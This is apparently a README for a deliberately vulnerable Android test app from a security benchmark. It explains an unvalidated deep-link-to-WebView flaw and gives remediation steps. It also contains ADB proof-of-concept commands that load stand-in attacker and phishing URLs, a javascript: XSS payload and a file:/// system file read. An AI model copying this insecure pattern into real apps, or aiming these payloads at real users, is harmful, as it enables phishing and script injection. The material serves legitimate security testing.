# oxo-android-ben40 News Reader App

## Challenge Details

### Description

This Android app sample demonstrates a news reader application with a critical WebView malicious URL vulnerability:

- The app provides a comprehensive news reading experience with multiple sections including article viewing, user profiles, settings, and premium content.
- The vulnerability exists in the deep link handling mechanism that forwards URLs to WebView components without proper validation.
- The app handles custom URL schemes (newsreader://) and forwards malicious URLs to WebView components, allowing attackers to redirect users to malicious sites.
- Deep link URLs can be disguised as legitimate app links but actually load arbitrary web content in the WebView.
- This creates opportunities for phishing attacks, cross-site scripting (XSS), data exfiltration, and unauthorized access to device resources.

The app showcases a realistic mobile news application that appears legitimate while containing a severe security flaw in deep link URL handling.

### Vulnerability Type and Category

- **Type:** WebView Malicious URL Loading / Deep Link URL Injection
- **Category:** Improper Input Validation, Insecure Deep Link Handling, URL Redirection Vulnerability

### Attack Vector: Deep Link URL Injection

This vulnerability occurs when an app handles deep links (custom URL schemes) but forwards malicious URLs to WebView components without proper validation. The specific attack characteristics include:

#### Key Vulnerability Components:
- **Custom URL Scheme Handling**: App registers custom URL scheme `newsreader://` for deep linking
- **Deep Link Router**: Routes deep link URLs directly to WebView without validation
- **Missing Host/Domain Validation**: No validation of destination URLs in deep link parameters
- **URL Parameter Injection**: Malicious URLs disguised as legitimate deep links
- **No Security Checks**: No allowlist, domain validation, or URL sanitization
- **Dangerous WebView Settings**: JavaScript enabled, file access enabled, DOM storage enabled

#### Exploitation Methods:
1. **Malicious Deep Link Creation**: Craft deep links that look legitimate but contain malicious URLs
2. **URL Parameter Injection**: Inject malicious URLs through deep link parameters
3. **Phishing via Deep Links**: Create convincing deep links that redirect to fake login pages
4. **JavaScript Injection**: Execute malicious JavaScript via deep link URL parameters
5. **Cross-App Exploitation**: Any app can trigger the deep link to launch malicious content

### Difficulty

Medium

## Testing the Vulnerability

### Prerequisites
- Android device or emulator with the app installed
- ADB (Android Debug Bridge) installed and device connected

### Vulnerability Test Commands

#### Basic Deep Link Tests
```bash
# Legitimate article deep link
adb shell am start -W -a android.intent.action.VIEW -d "newsreader://article?url=https://www.bbc.com/news&title=BBC%20News" co.ostorlab.myapplication

# Malicious URL injection via article deep link
adb shell am start -W -a android.intent.action.VIEW -d "newsreader://article?url=http://malicious-site.com&title=Important%20Update" co.ostorlab.myapplication
```

#### Phishing Attack Simulation
```bash
# Fake banking site with legitimate-looking title
adb shell am start -W -a android.intent.action.VIEW -d "newsreader://article?url=http://fake-banking-login.com&title=Bank%20Security%20Alert" co.ostorlab.myapplication
```

#### Share Deep Link Exploitation
```bash
# Malicious content sharing
adb shell am start -W -a android.intent.action.VIEW -d "newsreader://share?content=http://phishing-site.com" co.ostorlab.myapplication
```

#### Direct Redirect Exploitation
```bash
# Direct redirect to any URL
adb shell am start -W -a android.intent.action.VIEW -d "newsreader://redirect?to=http://attacker-controlled.com" co.ostorlab.myapplication

# JavaScript injection via redirect
adb shell am start -W -a android.intent.action.VIEW -d "newsreader://redirect?to=javascript:alert('Deep%20Link%20XSS')" co.ostorlab.myapplication
```

#### Advanced Exploitation
```bash
# File protocol access
adb shell am start -W -a android.intent.action.VIEW -d "newsreader://article?url=file:///system/etc/hosts&title=System%20Files" co.ostorlab.myapplication

# Custom parameters with fallback URL extraction
adb shell am start -W -a android.intent.action.VIEW -d "newsreader://unknown?url=http://evil-site.com" co.ostorlab.myapplication
```

### Expected Behavior
- The app should handle deep links with the custom `newsreader://` scheme
- Deep link parameters should be forwarded to the WebView without validation
- Malicious URLs should load directly in the WebView component
- No security warnings or URL validation should occur
- The vulnerability allows complete bypass of intended deep link restrictions through URL parameter injection

### Deep Link Vulnerability Explanation

The app registers the custom URL scheme `newsreader://` and routes different deep link patterns:

1. **Article Links**: `newsreader://article?url=<URL>&title=<TITLE>`
2. **Share Links**: `newsreader://share?content=<URL>`  
3. **Redirect Links**: `newsreader://redirect?to=<URL>`
4. **Fallback**: Any deep link with `url` parameter gets forwarded

The vulnerability occurs because:
- No validation of the destination URL in deep link parameters
- Direct forwarding to WebView without security checks
- Missing allowlist or domain restrictions
- Malicious URLs can be disguised as legitimate app deep links

### Remediation
To fix this vulnerability:
1. Add URL validation and allowlisting for trusted domains
2. Disable JavaScript in WebView unless absolutely necessary
3. Restrict file access permissions
4. Validate and sanitize all intent parameters
5. Consider making the activity non-exported if external access isn't required

## Build Instructions

This sample project uses Android Studio with Kotlin and AndroidX libraries.

- Open the project in Android Studio.
- Update your SDK versions as required (compileSdkVersion >= 31 recommended).
- Ensure all dependencies are properly configured in the Gradle files.
- Build and deploy the app on an emulator or an Android device.
- The app will launch with the main news feed and allow navigation between different sections.
- Use the ADB commands above to test the vulnerability.
